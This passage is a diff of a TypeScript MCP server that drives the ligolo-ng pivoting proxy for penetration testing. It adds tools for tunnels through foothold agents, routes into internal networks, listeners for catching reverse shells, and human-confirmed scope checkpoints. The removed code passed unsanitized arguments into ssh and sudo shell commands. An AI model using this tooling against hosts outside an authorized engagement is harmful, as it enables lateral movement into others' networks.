@@ -1,5 +1,16 @@
 #!/usr/bin/env node
 
+// Ligolo-ng MCP server.
+//
+// Every tool is a call against the ligolo proxy's authenticated REST
+// control plane. Nothing here shells out to `ssh`, greps a log, or types
+// into the readline console — the previous implementation did all three
+// and therefore could not move a packet (see README §Why this fork).
+//
+// Reachability-changing tools (tunnel start, route add, listener add)
+// run the framework's lateral-movement hard checkpoint first and refuse
+// to touch the API when it denies. See src/ligolo.ts.
+
 import { Server } from "@modelcontextprotocol/sdk/server/index.js";
 import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
 import {
@@ -7,692 +18,641 @@ import {
   ListToolsRequestSchema,
   Tool,
 } from "@modelcontextprotocol/sdk/types.js";
-import { exec, spawn, ChildProcess } from "child_process";
-import { promisify } from "util";
 
-const execAsync = promisify(exec);
+import {
+  assertScope,
+  certFingerprint,
+  Config,
+  GateError,
+  LigoloApi,
+  loadConfig,
+  logCommand,
+  requireAgent,
+  AgentRecord,
+  ListenerRecord,
+} from "./ligolo.js";
+import { proxyStatus, startProxy, stopProxy } from "./proxy.js";
 
-// Configuration
-const KALI_HOST = process.env.KALI_HOST || "kali";
-const PROXY_PORT = process.env.LIGOLO_PROXY_PORT || "11601";
-const API_PORT = process.env.LIGOLO_API_PORT || "8080";
-const DEFAULT_INTERFACE = process.env.LIGOLO_INTERFACE || "ligolo";
+const cfg: Config = loadConfig();
+const api = new LigoloApi(cfg);
 
-// State tracking
-interface ProxyState {
-  running: boolean;
-  pid?: number;
-  process?: ChildProcess;
-  selfcert: boolean;
-  apiEnabled: boolean;
+type Args = Record<string, unknown>;
+
+function str(args: Args, key: string, fallback = ""): string {
+  const v = args[key];
+  return typeof v === "string" && v.trim() !== "" ? v.trim() : fallback;
 }
 
-let proxyState: ProxyState = {
-  running: false,
-  selfcert: true,
-  apiEnabled: false,
-};
-
-// Helper function to execute commands on Kali
-async function sshExec(command: string): Promise<{ stdout: string; stderr: string }> {
-  const sshCommand = `ssh ${KALI_HOST} "${command.replace(/"/g, '\\"')}"`;
-  return execAsync(sshCommand, { timeout: 30000 });
+function bool(args: Args, key: string, fallback = false): boolean {
+  const v = args[key];
+  return typeof v === "boolean" ? v : fallback;
 }
 
-// Helper to check if ligolo-proxy is running on Kali
-async function checkProxyRunning(): Promise<boolean> {
-  try {
-    const { stdout } = await sshExec("pgrep -f ligolo-proxy");
-    return stdout.trim().length > 0;
-  } catch {
-    return false;
-  }
+function num(args: Args, key: string): number | null {
+  const v = args[key];
+  if (typeof v === "number" && Number.isFinite(v)) return v;
+  if (typeof v === "string" && /^\d+$/.test(v.trim())) return Number(v.trim());
+  return null;
 }
 
-// Define tools
-const tools: Tool[] = [
-  {
-    name: "ligolo_proxy_start",
-    description: "Start the ligolo-ng proxy server on Kali. The proxy accepts agent connections and manages tunnels.",
-    inputSchema: {
-      type: "object" as const,
-      properties: {
-        selfcert: {
-          type: "boolean",
-          description: "Use self-signed certificates (default: true)",
-          default: true,
-        },
-        port: {
-          type: "string",
-          description: "Port for agents to connect (default: 11601)",
-          default: "11601",
-        },
-        enableApi: {
-          type: "boolean",
-          description: "Enable the web API for remote control",
-          default: false,
-        },
-        apiPort: {
-          type: "string",
-          description: "Port for the web API (default: 8080)",
-          default: "8080",
-        },
-        daemonMode: {
-          type: "boolean",
-          description: "Run proxy in daemon/background mode",
-          default: true,
-        },
-      },
-      required: [],
-    },
-  },
-  {
-    name: "ligolo_proxy_stop",
-    description: "Stop the running ligolo-ng proxy server on Kali",
-    inputSchema: {
-      type: "object" as const,
-      properties: {},
-      required: [],
-    },
-  },
+/** A gated mutation: checkpoint first, then act, then record. */
+function gate(target: string, confirmed: boolean, summary: string): void {
+  assertScope(cfg, target, confirmed);
+  logCommand(cfg, summary);
+}
+
+function log(summary: string): void {
+  logCommand(cfg, summary);
+}
+
+const TARGET = {
+  type: "string",
+  description:
+    "In-scope host/address behind the pivot that this action makes reachable. Required by the lateral-movement " +
+    "hard checkpoint (scope_check.py); visible-but-unlisted networks are still out of scope.",
+} as const;
+
+const CONFIRMED = {
+  type: "boolean",
+  description:
+    "Set true only after a human approved this pivot and it is recorded in state/decisions.md. Never set it " +
+    "speculatively: scope_check.py exits 5 until the checkpoint is genuinely cleared.",
+  default: false,
+} as const;
+
+const AGENT_ID = {
+  type: "string",
+  description: "Agent id from ligolo_agents_list (e.g. \"1\"). The console's \"selected session\" does not exist here.",
+} as const;
+
+const readTools: Tool[] = [
   {
     name: "ligolo_proxy_status",
-    description: "Check the status of the ligolo-ng proxy server",
-    inputSchema: {
-      type: "object" as const,
-      properties: {},
-      required: [],
-    },
+    description:
+      "Check the ligolo proxy: API liveness (GET /api/v1/ping), pid, binary, config and log paths. Read-only.",
+    inputSchema: { type: "object" as const, properties: {}, required: [] },
+    annotations: { readOnlyHint: true },
   },
   {
     name: "ligolo_agents_list",
-    description: "List all connected agents to the ligolo-ng proxy",
-    inputSchema: {
-      type: "object" as const,
-      properties: {},
-      required: [],
-    },
+    description:
+      "List connected agents: name, session id, remote address, tunnel state and the full agent-side interface list " +
+      "with addresses (this replaces the console's `ifconfig`). Read-only.",
+    inputSchema: { type: "object" as const, properties: {}, required: [] },
+    annotations: { readOnlyHint: true },
   },
   {
     name: "ligolo_session_select",
-    description: "Select an agent session to work with",
+    description:
+      "Resolve one agent by id and return its record. Kept for compatibility with the old tool surface: there is no " +
+      "persistent session selection over the API — pass agentId to the tunnel/listener tools instead. Read-only.",
     inputSchema: {
       type: "object" as const,
-      properties: {
-        sessionId: {
-          type: "number",
-          description: "Session ID number to select (from agents list)",
-        },
-      },
+      properties: { sessionId: { type: "number", description: "Agent id from ligolo_agents_list" } },
       required: ["sessionId"],
     },
-  },
-  {
-    name: "ligolo_interface_create",
-    description: "Create a TUN interface for ligolo-ng tunneling",
-    inputSchema: {
-      type: "object" as const,
-      properties: {
-        name: {
-          type: "string",
-          description: "Name of the TUN interface to create",
-          default: "ligolo",
-        },
-      },
-      required: [],
-    },
-  },
-  {
-    name: "ligolo_interface_list",
-    description: "List all TUN interfaces on Kali",
-    inputSchema: {
-      type: "object" as const,
-      properties: {},
-      required: [],
-    },
-  },
-  {
-    name: "ligolo_tunnel_start",
-    description: "Start a tunnel through a selected agent session",
-    inputSchema: {
-      type: "object" as const,
-      properties: {
-        tun: {
-          type: "string",
-          description: "TUN interface name to use",
-          default: "ligolo",
-        },
-      },
-      required: [],
-    },
-  },
-  {
-    name: "ligolo_tunnel_stop",
-    description: "Stop the active tunnel",
-    inputSchema: {
-      type: "object" as const,
-      properties: {},
-      required: [],
-    },
-  },
-  {
-    name: "ligolo_route_add",
-    description: "Add a route to access the agent's network through the tunnel",
-    inputSchema: {
-      type: "object" as const,
-      properties: {
-        network: {
-          type: "string",
-          description: "Network CIDR to route (e.g., 10.10.10.0/24)",
-        },
-        interface: {
-          type: "string",
-          description: "TUN interface name",
-          default: "ligolo",
-        },
-      },
-      required: ["network"],
-    },
-  },
-  {
-    name: "ligolo_route_delete",
-    description: "Delete a route from the routing table",
-    inputSchema: {
-      type: "object" as const,
-      properties: {
-        network: {
-          type: "string",
-          description: "Network CIDR to remove from routes",
-        },
-      },
-      required: ["network"],
-    },
-  },
-  {
-    name: "ligolo_route_list",
-    description: "List all routes configured for ligolo interfaces",
-    inputSchema: {
-      type: "object" as const,
-      properties: {},
-      required: [],
-    },
-  },
-  {
-    name: "ligolo_listener_add",
-    description: "Add a listener on the agent to forward ports back to the attacker",
-    inputSchema: {
-      type: "object" as const,
-      properties: {
-        localAddress: {
-          type: "string",
-          description: "Local address to listen on (e.g., 0.0.0.0:4444)",
-        },
-        remoteAddress: {
-          type: "string",
-          description: "Remote address to forward to (e.g., 127.0.0.1:4444 on Kali)",
-        },
-      },
-      required: ["localAddress", "remoteAddress"],
-    },
-  },
-  {
-    name: "ligolo_listener_list",
-    description: "List all active listeners",
-    inputSchema: {
-      type: "object" as const,
-      properties: {},
-      required: [],
-    },
-  },
-  {
-    name: "ligolo_listener_delete",
-    description: "Delete a listener",
-    inputSchema: {
-      type: "object" as const,
-      properties: {
-        listenerId: {
-          type: "number",
-          description: "ID of the listener to delete",
-        },
-      },
-      required: ["listenerId"],
-    },
+    annotations: { readOnlyHint: true },
   },
   {
     name: "ligolo_agent_info",
-    description: "Get network information from the selected agent (ifconfig)",
+    description:
+      "Agent-side network detail: interfaces, flags, MTU and addresses. Optionally narrow to one agent id. Read-only.",
     inputSchema: {
       type: "object" as const,
-      properties: {},
+      properties: { sessionId: { type: "number", description: "Optional agent id" } },
       required: [],
     },
+    annotations: { readOnlyHint: true },
+  },
+  {
+    name: "ligolo_interface_list",
+    description: "Configured TUN interfaces with their routed destinations and active state. Read-only.",
+    inputSchema: { type: "object" as const, properties: {}, required: [] },
+    annotations: { readOnlyHint: true },
+  },
+  {
+    name: "ligolo_route_list",
+    description: "Routes per interface, flattened, with active state. Read-only.",
+    inputSchema: { type: "object" as const, properties: {}, required: [] },
+    annotations: { readOnlyHint: true },
+  },
+  {
+    name: "ligolo_listener_list",
+    description: "Active listeners/redirectors across agents (agent, listen addr, redirect addr, network, online). Read-only.",
+    inputSchema: { type: "object" as const, properties: {}, required: [] },
+    annotations: { readOnlyHint: true },
   },
   {
     name: "ligolo_certificate_fingerprint",
-    description: "Get the certificate fingerprint for agent verification",
-    inputSchema: {
-      type: "object" as const,
-      properties: {},
-      required: [],
-    },
+    description:
+      "SHA-256 fingerprint of the proxy's cached selfcert, in the exact form `-accept-fingerprint` wants. Read-only, " +
+      "no console needed. Errors if the proxy has not been started with -selfcert yet.",
+    inputSchema: { type: "object" as const, properties: {}, required: [] },
+    annotations: { readOnlyHint: true },
   },
   {
     name: "ligolo_agent_command",
-    description: "Generate the agent command to run on target machines",
+    description:
+      "Generate the agent command for a foothold. Fingerprint-pinned by default (pass fingerprint or call " +
+      "ligolo_certificate_fingerprint); -ignore-cert only behind debugIgnoreCert.",
     inputSchema: {
       type: "object" as const,
       properties: {
-        proxyIp: {
-          type: "string",
-          description: "IP address of the proxy server (Kali)",
-        },
-        port: {
-          type: "string",
-          description: "Port the proxy is listening on",
-          default: "11601",
-        },
-        ignoreCert: {
+        proxyIp: { type: "string", description: "Address the foothold reaches the operator on" },
+        port: { type: "string", description: "Proxy listen port", default: "11601" },
+        fingerprint: { type: "string", description: "SHA-256 from ligolo_certificate_fingerprint" },
+        retry: { type: "boolean", description: "Add -retry", default: true },
+        useWs: { type: "boolean", description: "WebSocket transport (-ws)", default: false },
+        debugIgnoreCert: {
           type: "boolean",
-          description: "Ignore certificate verification (for self-signed)",
-          default: true,
-        },
-        fingerprint: {
-          type: "string",
-          description: "Certificate fingerprint for verification (optional)",
-        },
-        useWs: {
-          type: "boolean",
-          description: "Use WebSocket transport",
+          description: "Emit -ignore-cert instead of a pinned fingerprint. Debug only: accepts any MITM.",
           default: false,
-        },
-        retry: {
-          type: "boolean",
-          description: "Auto-retry on connection error",
-          default: true,
         },
       },
       required: ["proxyIp"],
     },
-  },
-  {
-    name: "ligolo_send_command",
-    description: "Send a raw command to the ligolo-ng proxy console (advanced)",
-    inputSchema: {
-      type: "object" as const,
-      properties: {
-        command: {
-          type: "string",
-          description: "Raw command to send to ligolo-ng console",
-        },
-      },
-      required: ["command"],
-    },
+    annotations: { readOnlyHint: true },
   },
 ];
 
-// Tool handlers
-async function handleToolCall(
-  name: string,
-  args: Record<string, unknown>
-): Promise<string> {
+const writeTools: Tool[] = [
+  {
+    name: "ligolo_proxy_start",
+    description:
+      "Start the proxy locally (headless, -selfcert, API enabled) with a config seeded for loopback API use, then " +
+      "wait for /api/v1/ping. Existing config is only rewritten with rewriteConfig: true (original kept as .bak).",
+    inputSchema: {
+      type: "object" as const,
+      properties: {
+        port: { type: "string", description: "Agent-facing listen port", default: "11601" },
+        rewriteConfig: {
+          type: "boolean",
+          description: "Rewrite an existing ligolo-ng.yaml that lacks web.enabled/web.users (backup written first)",
+          default: false,
+        },
+      },
+      required: [],
+    },
+    annotations: { readOnlyHint: false, destructiveHint: false },
+  },
+  {
+    name: "ligolo_proxy_stop",
+    description: "Stop the proxy process started by ligolo_proxy_start (SIGTERM via its pid file). Does not touch agents.",
+    inputSchema: { type: "object" as const, properties: {}, required: [] },
+    annotations: { readOnlyHint: false, destructiveHint: true },
+  },
+  {
+    name: "ligolo_interface_create",
+    description:
+      "Register (and, with privileges, create) a TUN interface on the operator host. Local-only: no target is " +
+      "contacted, so no checkpoint is required.",
+    inputSchema: {
+      type: "object" as const,
+      properties: { name: { type: "string", description: "Interface name", default: "ligolo" } },
+      required: [],
+    },
+    annotations: { readOnlyHint: false, destructiveHint: false },
+  },
+  {
+    name: "ligolo_tunnel_start",
+    description:
+      "Start an agent's TUN tunnel on an interface (creates the interface first if unregistered). GATED: runs the " +
+      "lateral hard checkpoint for `target` before any API call.",
+    inputSchema: {
+      type: "object" as const,
+      properties: {
+        agentId: AGENT_ID,
+        tun: { type: "string", description: "TUN interface name", default: "ligolo" },
+        target: TARGET,
+        confirmed: CONFIRMED,
+      },
+      required: ["agentId", "target"],
+    },
+    annotations: { readOnlyHint: false, destructiveHint: false },
+  },
+  {
+    name: "ligolo_tunnel_stop",
+    description: "Stop an agent's tunnel (cleanup, not a new reachability transition). Logged, not checkpointed.",
+    inputSchema: {
+      type: "object" as const,
+      properties: { agentId: AGENT_ID },
+      required: ["agentId"],
+    },
+    annotations: { readOnlyHint: false, destructiveHint: true },
+  },
+  {
+    name: "ligolo_route_add",
+    description:
+      "Route a CIDR through an interface. GATED. For anything wider than /32 pass `target` explicitly — the " +
+      "representative in-scope host the checkpoint is evaluated against.",
+    inputSchema: {
+      type: "object" as const,
+      properties: {
+        network: { type: "string", description: "CIDR to route (e.g. 10.10.10.0/24)" },
+        interface: { type: "string", description: "TUN interface name", default: "ligolo" },
+        target: TARGET,
+        confirmed: CONFIRMED,
+      },
+      required: ["network"],
+    },
+    annotations: { readOnlyHint: false, destructiveHint: false },
+  },
+  {
+    name: "ligolo_route_delete",
+    description: "Remove a route from an interface (cleanup). Logged, not checkpointed.",
+    inputSchema: {
+      type: "object" as const,
+      properties: {
+        network: { type: "string", description: "CIDR to remove" },
+        interface: { type: "string", description: "TUN interface name", default: "ligolo" },
+      },
+      required: ["network"],
+    },
+    annotations: { readOnlyHint: false, destructiveHint: true },
+  },
+  {
+    name: "ligolo_listener_add",
+    description:
+      "Add a listener on the agent that relays back to the operator (reverse shell catch, payload serving). GATED: " +
+      "a listener is a resident artifact on a client host and must also be recorded in state/cleanup-pending.md.",
+    inputSchema: {
+      type: "object" as const,
+      properties: {
+        localAddress: { type: "string", description: "Listen address on the agent (e.g. 0.0.0.0:4444)" },
+        remoteAddress: { type: "string", description: "Operator-side target (e.g. 127.0.0.1:443)" },
+        network: { type: "string", description: "tcp, tcp4, tcp6, udp, udp4, udp6", default: "tcp" },
+        agentId: AGENT_ID,
+        target: TARGET,
+        confirmed: CONFIRMED,
+      },
+      required: ["localAddress", "remoteAddress", "agentId", "target"],
+    },
+    annotations: { readOnlyHint: false, destructiveHint: false },
+  },
+  {
+    name: "ligolo_listener_delete",
+    description: "Delete a listener by id on an agent (cleanup). Logged, not checkpointed.",
+    inputSchema: {
+      type: "object" as const,
+      properties: {
+        listenerId: { type: "number", description: "ListenerID from ligolo_listener_list" },
+        agentId: AGENT_ID,
+      },
+      required: ["listenerId", "agentId"],
+    },
+    annotations: { readOnlyHint: false, destructiveHint: true },
+  },
+  {
+    name: "ligolo_teardown",
+    description:
+      "Reverse a pivot through the API: stop the agent's tunnel, delete its listeners, and optionally delete the " +
+      "interface and its routes. The uploaded agent binary itself is still a foothold-side cleanup item.",
+    inputSchema: {
+      type: "object" as const,
+      properties: {
+        agentId: AGENT_ID,
+        interface: { type: "string", description: "TUN interface to remove when deleteInterface is true", default: "ligolo" },
+        deleteInterface: { type: "boolean", description: "Also delete the interface and its routes", default: false },
+      },
+      required: ["agentId"],
+    },
+    annotations: { readOnlyHint: false, destructiveHint: true },
+  },
+];
+
+const tools: Tool[] = cfg.readOnly ? readTools : [...readTools, ...writeTools];
+
+type Payload = Record<string, unknown>;
+
+async function handleProxyStart(args: Args): Promise<Payload> {
+  const state = await startProxy(cfg, bool(args, "rewriteConfig", false));
+  log(`ligolo_proxy_start api=${state.apiUrl} binary=${state.binary ?? "<missing>"}`);
+  let fingerprint: string | null = null;
+  let fingerprintError: string | null = null;
+  try {
+    fingerprint = certFingerprint(cfg);
+  } catch (err) {
+    fingerprintError = err instanceof Error ? err.message : String(err);
+  }
+  return { ...state, fingerprint, fingerprint_error: fingerprintError, scope_checked: false };
+}
+
+async function handleAgents(): Promise<Payload> {
+  const agents = await api.agents();
+  return {
+    scope_checked: false,
+    count: Object.keys(agents ?? {}).length,
+    agents: Object.entries(agents ?? {}).map(([id, a]) => ({
+      agent_id: id,
+      name: a.Name,
+      session_id: a.SessionID,
+      remote_addr: a.RemoteAddr,
+      tunnel_interface: a.Interface,
+      tunnel_running: a.Running,
+      interfaces: (a.Network ?? []).map((n) => ({ name: n.Name, mtu: n.MTU, addresses: n.Addresses ?? [] })),
+    })),
+  };
+}
+
+function agentDetail(id: string, agent: AgentRecord): Payload {
+  return {
+    scope_checked: false,
+    agent_id: id,
+    name: agent.Name,
+    session_id: agent.SessionID,
+    remote_addr: agent.RemoteAddr,
+    tunnel_interface: agent.Interface,
+    tunnel_running: agent.Running,
+    listeners: agent.Listeners ?? [],
+    interfaces: (agent.Network ?? []).map((n) => ({
+      name: n.Name,
+      index: n.Index,
+      mtu: n.MTU,
+      hardware_addr: n.HardwareAddr,
+      flags: n.Flags,
+      addresses: n.Addresses ?? [],
+    })),
+  };
+}
+
+async function handleTunnelStart(args: Args): Promise<Payload> {
+  const agentId = str(args, "agentId");
+  const tun = str(args, "tun", cfg.interfaceName);
+  const target = str(args, "target");
+  if (target === "") throw new Error("target is required: the in-scope host this tunnel makes reachable");
+  const agent = await requireAgent(api, agentId);
+  gate(
+    target,
+    bool(args, "confirmed", false),
+    `ligolo_tunnel_start agent=${agentId} (${agent.Name}) tun=${tun} target=${target}`,
+  );
+  const interfaces = await api.interfaces();
+  let interfaceCreated = false;
+  if (!(tun in (interfaces ?? {}))) {
+    await api.createInterface(tun);
+    interfaceCreated = true;
+  }
+  const started = await api.startTunnel(agentId, tun);
+  return {
+    scope_checked: true,
+    agent_id: agentId,
+    agent_name: agent.Name,
+    interface: tun,
+    interface_created: interfaceCreated,
+    message: started.message,
+    routed: (await api.interfaces())?.[tun]?.Routes ?? [],
+    next:
+      "Route the segment onto the interface (ligolo_route_add) if it is not already listed, then scan through the " +
+      "tun. Every newly reachable in-scope host belongs in state/hosts.md.",
+  };
+}
+
+async function handleRouteAdd(args: Args): Promise<Payload> {
+  const network = str(args, "network");
+  if (network === "") throw new Error("network is required (a CIDR)");
+  const iface = str(args, "interface", cfg.interfaceName);
+  const explicitTarget = str(args, "target");
+  const target = explicitTarget !== "" ? explicitTarget : network.endsWith("/32") ? network.slice(0, -3) : "";
+  if (target === "") {
+    throw new Error(
+      "target is required for a range wider than /32 — name one in-scope host inside it, so the checkpoint is " +
+        "evaluated against something real (visible != authorized).",
+    );
+  }
+  gate(target, bool(args, "confirmed", false), `ligolo_route_add ${network} dev ${iface} target=${target}`);
+  const applied = await api.addRoutes(iface, [network]);
+  return {
+    scope_checked: true,
+    network,
+    interface: iface,
+    message: applied.message,
+    note: "If the interface was not yet created, the route is stored and applied at tunnel start.",
+  };
+}
+
+async function handleListenerAdd(args: Args): Promise<Payload> {
+  const local = str(args, "localAddress");
+  const remote = str(args, "remoteAddress");
+  const agentId = str(args, "agentId");
+  const network = str(args, "network", "tcp");
+  const target = str(args, "target");
+  if (target === "") throw new Error("target is required: the foothold/segment host the listener sits on");
+  const agent = await requireAgent(api, agentId);
+  gate(
+    target,
+    bool(args, "confirmed", false),
+    `ligolo_listener_add agent=${agentId} addr=${local} to=${remote} network=${network} target=${target}`,
+  );
+  const created = await api.createListener(agentId, local, remote, network);
+  const listeners = (await api.listeners()) ?? [];
+  const mine = listeners.filter((l: ListenerRecord) => String(l.AgentID) === agentId && l.ListenerAddr === local);
+  return {
+    scope_checked: true,
+    agent_id: agentId,
+    agent_name: agent.Name,
+    message: created.message,
+    listener: mine[0] ?? null,
+    cleanup: `Record in state/cleanup-pending.md: listener ${local} -> ${remote} (${network}) on agent ${agentId}; revert with listener_stop ${mine[0]?.ListenerID ?? "<id>"}.`,
+  };
+}
+
+async function handleTeardown(args: Args): Promise<Payload> {
+  const agentId = str(args, "agentId");
+  const iface = str(args, "interface", cfg.interfaceName);
+  const deleteInterface = bool(args, "deleteInterface", false);
+  log(`ligolo_teardown agent=${agentId} interface=${iface} delete_interface=${deleteInterface}`);
+  const steps: Payload[] = [];
+  const attempt = async (label: string, fn: () => Promise<unknown>): Promise<void> => {
+    try {
+      const result = await fn();
+      steps.push({ step: label, ok: true, result });
+    } catch (err) {
+      steps.push({ step: label, ok: false, error: err instanceof Error ? err.message : String(err) });
+    }
+  };
+  const listeners = (await api.listeners().catch(() => [])) ?? [];
+  for (const listener of listeners.filter((l) => String(l.AgentID) === agentId)) {
+    await attempt(`delete listener ${listener.ListenerID}`, () => api.deleteListener(agentId, listener.ListenerID));
+  }
+  // Routes are deleted while the TUN still exists: stopping the tunnel tears
+  // the interface down underneath us and the proxy then answers 500
+  // ("no such process") for every route it can no longer find. A route that
+  // is already gone counts as cleaned up, not as a failure.
+  const interfaces = await api.interfaces().catch(() => ({}) as Record<string, unknown>);
+  const record = (interfaces ?? {})[iface] as { Routes?: { Destination: string }[] } | undefined;
+  const routes = (record?.Routes ?? []).filter((r) => !r.Destination.includes(":"));
+  for (const route of routes) {
+    await attempt(`delete route ${route.Destination}`, () =>
+      api.deleteRoute(iface, route.Destination).catch((err: unknown) => {
+        const message = err instanceof Error ? err.message : String(err);
+        if (/no such process|does not exist|not found/i.test(message)) return { message: "already gone" };
+        throw err;
+      }),
+    );
+  }
+  await attempt("stop tunnel", () => api.stopTunnel(agentId));
+  if (deleteInterface) {
+    await attempt(`delete interface ${iface}`, () => api.deleteInterface(iface));
+  }
+  return {
+    scope_checked: false,
+    agent_id: agentId,
+    steps,
+    note:
+      "Resolve state/cleanup-pending.md entries for this pivot (uploaded agent binary, listeners) and delete the " +
+      "agent binary on the foothold; the API cannot unlink files on the client.",
+  };
+}
+
+async function handleToolCall(name: string, args: Args): Promise<Payload> {
   switch (name) {
-    case "ligolo_proxy_start": {
-      const isRunning = await checkProxyRunning();
-      if (isRunning) {
-        return "Ligolo-ng proxy is already running on Kali";
-      }
-
-      const selfcert = args.selfcert !== false;
-      const port = (args.port as string) || PROXY_PORT;
-      const enableApi = args.enableApi === true;
-      const apiPort = (args.apiPort as string) || API_PORT;
-      const daemonMode = args.daemonMode !== false;
-
-      let cmd = "ligolo-proxy";
-      if (selfcert) cmd += " -selfcert";
-      cmd += ` -laddr 0.0.0.0:${port}`;
-
-      if (enableApi) {
-        cmd += ` -api -api-addr 0.0.0.0:${apiPort}`;
-      }
-
-      if (daemonMode) {
-        cmd = `nohup ${cmd} > /tmp/ligolo-proxy.log 2>&1 &`;
-      }
-
-      try {
-        await sshExec(cmd);
-        await new Promise((resolve) => setTimeout(resolve, 2000)); // Wait for startup
-
-        const running = await checkProxyRunning();
-        if (running) {
-          proxyState.running = true;
-          proxyState.selfcert = selfcert;
-          proxyState.apiEnabled = enableApi;
-
-          return `Ligolo-ng proxy started successfully on Kali
-- Listening on: 0.0.0.0:${port}
-- Self-signed cert: ${selfcert}
-- API enabled: ${enableApi}${enableApi ? ` (port ${apiPort})` : ""}
-- Daemon mode: ${daemonMode}
-
-Agents can connect using:
-./agent -connect <kali-ip>:${port}${selfcert ? " -ignore-cert" : ""}`;
-        } else {
-          return "Failed to start ligolo-ng proxy. Check if it's installed on Kali.";
-        }
-      } catch (error) {
-        return `Error starting proxy: ${error instanceof Error ? error.message : String(error)}`;
-      }
-    }
-
+    case "ligolo_proxy_start":
+      return handleProxyStart(args);
     case "ligolo_proxy_stop": {
-      try {
-        await sshExec("pkill -f ligolo-proxy");
-        proxyState.running = false;
-        return "Ligolo-ng proxy stopped successfully";
-      } catch (error) {
-        return `Error stopping proxy: ${error instanceof Error ? error.message : String(error)}`;
-      }
+      const state = await stopProxy(cfg);
+      log(`ligolo_proxy_stop pid=${state.stoppedPid ?? "none"} running=${state.running}`);
+      return { ...state, scope_checked: false };
     }
-
-    case "ligolo_proxy_status": {
-      try {
-        const running = await checkProxyRunning();
-        if (running) {
-          const { stdout: pid } = await sshExec("pgrep -f ligolo-proxy");
-          const { stdout: log } = await sshExec("tail -20 /tmp/ligolo-proxy.log 2>/dev/null || echo 'No log available'");
-
-          return `Ligolo-ng proxy status: RUNNING
-PID: ${pid.trim()}
-
-Recent log output:
-${log}`;
-        } else {
-          return "Ligolo-ng proxy status: NOT RUNNING";
-        }
-      } catch (error) {
-        return `Error checking status: ${error instanceof Error ? error.message : String(error)}`;
-      }
-    }
-
-    case "ligolo_agents_list": {
-      // This would ideally use the API if enabled, otherwise parse log
-      try {
-        const { stdout } = await sshExec("tail -100 /tmp/ligolo-proxy.log 2>/dev/null | grep -E 'Agent joined|session' || echo 'No agents found in log'");
-        return `Connected Agents (from log):
-${stdout}
-
-Note: For real-time agent listing, enable the API with ligolo_proxy_start --enableApi`;
-      } catch (error) {
-        return `Error listing agents: ${error instanceof Error ? error.message : String(error)}`;
-      }
-    }
-
+    case "ligolo_proxy_status":
+      return { ...(await proxyStatus(cfg)), scope_checked: false };
+    case "ligolo_agents_list":
+      return handleAgents();
     case "ligolo_session_select": {
-      const sessionId = args.sessionId as number;
-      // Would need interactive console or API access
-      return `Session selection requires interactive access.
-
-Use screen/tmux to interact with ligolo-ng proxy directly, or enable the API.
-
-Command to run manually on Kali:
-  session
-  (select session ${sessionId})`;
+      const id = num(args, "sessionId");
+      if (id === null) throw new Error("sessionId is required (an agent id from ligolo_agents_list)");
+      return agentDetail(String(id), await requireAgent(api, String(id)));
     }
-
-    case "ligolo_interface_create": {
-      const ifaceName = (args.name as string) || DEFAULT_INTERFACE;
-      try {
-        // Create TUN interface on Kali
-        await sshExec(`sudo ip tuntap add user root mode tun ${ifaceName}`);
-        await sshExec(`sudo ip link set ${ifaceName} up`);
-
-        return `TUN interface '${ifaceName}' created and brought up on Kali.
-
-Next steps:
-1. Select an agent session
-2. Add routes: ligolo_route_add --network <target-network>
-3. Start tunnel: ligolo_tunnel_start --tun ${ifaceName}`;
-      } catch (error) {
-        // Interface might already exist
-        const errMsg = error instanceof Error ? error.message : String(error);
-        if (errMsg.includes("File exists")) {
-          return `Interface '${ifaceName}' already exists. Use ligolo_interface_list to view interfaces.`;
-        }
-        return `Error creating interface: ${errMsg}`;
-      }
-    }
-
-    case "ligolo_interface_list": {
-      try {
-        const { stdout } = await sshExec("ip link show type tun");
-        return `TUN Interfaces on Kali:
-${stdout || "No TUN interfaces found"}`;
-      } catch (error) {
-        return `Error listing interfaces: ${error instanceof Error ? error.message : String(error)}`;
-      }
-    }
-
-    case "ligolo_tunnel_start": {
-      const tun = (args.tun as string) || DEFAULT_INTERFACE;
-      return `To start the tunnel, run in the ligolo-ng console:
-
-  tunnel_start --tun ${tun}
-
-Note: This requires an active session to be selected first.
-For automation, use the ligolo-ng API.`;
-    }
-
-    case "ligolo_tunnel_stop": {
-      return `To stop the tunnel, run in the ligolo-ng console:
-
-  tunnel_stop
-
-Or simply select a different session.`;
-    }
-
-    case "ligolo_route_add": {
-      const network = args.network as string;
-      const iface = (args.interface as string) || DEFAULT_INTERFACE;
-
-      if (!network) {
-        return "Error: network parameter is required (e.g., 10.10.10.0/24)";
-      }
-
-      try {
-        await sshExec(`sudo ip route add ${network} dev ${iface}`);
-        return `Route added: ${network} via interface ${iface}
-
-You can now access hosts on ${network} through the ligolo tunnel.
-Make sure the tunnel is started with: tunnel_start --tun ${iface}`;
-      } catch (error) {
-        const errMsg = error instanceof Error ? error.message : String(error);
-        if (errMsg.includes("File exists")) {
-          return `Route to ${network} already exists.`;
-        }
-        return `Error adding route: ${errMsg}`;
-      }
-    }
-
-    case "ligolo_route_delete": {
-      const network = args.network as string;
-
-      if (!network) {
-        return "Error: network parameter is required";
-      }
-
-      try {
-        await sshExec(`sudo ip route del ${network}`);
-        return `Route to ${network} deleted successfully`;
-      } catch (error) {
-        return `Error deleting route: ${error instanceof Error ? error.message : String(error)}`;
-      }
-    }
-
-    case "ligolo_route_list": {
-      try {
-        const { stdout } = await sshExec(`ip route show | grep -E '${DEFAULT_INTERFACE}|ligolo|tun'`);
-        return `Ligolo routes:
-${stdout || "No ligolo routes found"}`;
-      } catch (error) {
-        return `Error listing routes: ${error instanceof Error ? error.message : String(error)}`;
-      }
-    }
-
-    case "ligolo_listener_add": {
-      const local = args.localAddress as string;
-      const remote = args.remoteAddress as string;
-
-      return `To add a listener, run in the ligolo-ng console:
-
-  listener_add --addr ${local} --to ${remote}
-
-This will:
-- Listen on ${local} on the agent machine
-- Forward connections to ${remote} (typically your Kali machine)
-
-Example use case: Reverse shell callback
-  listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444`;
-    }
-
-    case "ligolo_listener_list": {
-      return `To list listeners, run in the ligolo-ng console:
-
-  listener_list
-
-For API access, enable it when starting the proxy.`;
-    }
-
-    case "ligolo_listener_delete": {
-      const listenerId = args.listenerId as number;
-      return `To delete a listener, run in the ligolo-ng console:
-
-  listener_delete ${listenerId}`;
-    }
-
     case "ligolo_agent_info": {
-      return `To get agent network info, run in the ligolo-ng console after selecting a session:
-
-  ifconfig
-
-This will show the agent's network interfaces and IP addresses.`;
+      const id = num(args, "sessionId");
